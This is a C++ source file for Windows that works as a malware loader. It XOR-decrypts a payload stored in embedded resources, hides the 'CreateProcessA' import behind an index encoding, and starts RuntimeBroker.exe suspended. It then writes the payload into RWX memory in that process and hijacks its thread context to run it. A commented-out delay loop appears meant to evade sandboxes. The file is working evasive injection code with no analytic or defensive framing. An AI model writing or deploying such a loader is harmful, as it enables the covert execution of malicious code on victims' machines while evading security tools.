#include <windows.h>
#include <tlhelp32.h>
#include <wincrypt.h>
#include <iostream>
#include <random>
#include <cstdlib>
#include <ctime>

#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "user32.lib")

// Character set (lowercase, uppercase, digits)
char char_set[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";

// Decode function that maps positions back to characters
std::string decode_from_positions(const int positions[], size_t size) {
    std::string decoded_string;
    for (size_t i = 0; i < size; ++i) {
        int pos = positions[i];
        if (pos >= 0 && pos < sizeof(char_set) - 1) { // -1 to exclude null terminator
            decoded_string.push_back(char_set[pos]);
        } else {
            throw std::invalid_argument("Position out of bounds");
        }
    }
    return decoded_string;
}

// Function that performs the main logic when i == 1
void main_star() {
    char* ke;
    DWORD keLen;
    HMODULE hModule = GetModuleHandle(NULL);
    HRSRC hResource = FindResource(hModule, "dhanushkey1", RT_RCDATA);
    HGLOBAL resrdata = LoadResource(hModule, hResource);
    keLen = SizeofResource(hModule, hResource);
    ke = (char*)LockResource(resrdata);

    // Load the second resource (dhanushcode56)
    char* code199k;
    DWORD code199kLen;
    hResource = FindResource(hModule, "dhanushcode56", RT_RCDATA);
    resrdata = LoadResource(hModule, hResource);
    code199kLen = SizeofResource(hModule, hResource);
    code199k = (char*)LockResource(resrdata);
    
    const char* processptaah = "c:\\windows\\system32\\RuntimeBroker.exe";

    STARTUPINFO li = {0};
    
    HMODULE istfromKernel32 = LoadLibraryA("kernel32.dll");

    // Decode "CreateProcessA" using the predefined positions
    int encoded_data[] = {28, 17, 4, 29, 19, 4, 31, 34, 31, 44, 44, 27};
    size_t data_size = sizeof(encoded_data) / sizeof(encoded_data[0]);
    std::string decoded_function = decode_from_positions(encoded_data, data_size);

    // Use decoded function name
    BOOL (*itscreatetPro)(LPCSTR lpApplicationName, LPSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, 
                          LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, 
                          LPVOID lpEnvironment, LPCSTR lpCurrentDirectory, LPSTARTUPINFOA lpStartupInfo, 
                          LPPROCESS_INFORMATION lpProcessInformation) = 
        (BOOL(*)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, 
                 LPSTARTUPINFOA, LPPROCESS_INFORMATION)) GetProcAddress(istfromKernel32, decoded_function.c_str());

    LPVOID (*pVirtualAllnocEkx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD) = 
        (LPVOID(*)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD)) GetProcAddress(istfromKernel32, "VirtualAllocEx");

    BOOL (*pWriteProcessM)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*) = 
        (BOOL(*)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*)) GetProcAddress(istfromKernel32, "WriteProcessMemory");

    PROCESS_INFORMATION pi = {0};
    li.cb = sizeof(li);

    itscreatetPro(processptaah, 0, 0, 0, FALSE, CREATE_SUSPENDED, 0, 0, &li, &pi);
    GetTickCount();

    CONTEXT ctx = {0};
    ctx.ContextFlags = CONTEXT_FULL;
    auto pGetThreadContext = (BOOL(WINAPI*)(HANDLE, LPCONTEXT)) GetProcAddress(istfromKernel32, "GetThreadContext");
    pGetThreadContext(pi.hThread, &ctx);

    LPVOID gallio = pVirtualAllnocEkx(pi.hProcess, NULL, code199kLen, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    for (DWORD i = 0; i < code199kLen; i++) {
        code199k[i] ^= ke[i % keLen];
    }
    pWriteProcessM(pi.hProcess, gallio, code199k, code199kLen, NULL);
    ctx.Rcx = (DWORD64)gallio;

    auto pSetThreadContext = (BOOL(WINAPI*)(HANDLE, LPCONTEXT)) GetProcAddress(istfromKernel32, "SetThreadContext");
    pSetThreadContext(pi.hThread, &ctx);

    auto pResumeThread = (DWORD(WINAPI*)(HANDLE)) GetProcAddress(istfromKernel32, "ResumeThread");
    pResumeThread(pi.hThread); 
}

int main() {
    //unsigned long long i = 0;  // Change this value to control the flow

    //for(;i < 189642300000; i++) {
        //i +=i % 0xff; 
    //}
    //printf("%llu\n", i);
    
    //if (i == 189642300001) {
        main_star();
    //}

    return 0;
}
